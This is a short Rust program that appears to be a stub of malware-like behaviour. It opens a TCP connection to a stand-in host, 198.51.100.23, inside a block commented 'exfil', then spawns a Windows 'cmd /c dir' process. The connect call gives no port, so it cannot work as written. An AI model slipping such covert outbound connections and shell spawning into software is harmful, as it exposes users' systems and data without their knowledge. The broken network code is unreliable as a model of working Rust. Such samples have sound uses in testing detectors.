use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("198.51.100.23") { /* exfil */ }
    Command::new("cmd").arg("/c").arg("dir").spawn().ok();
}
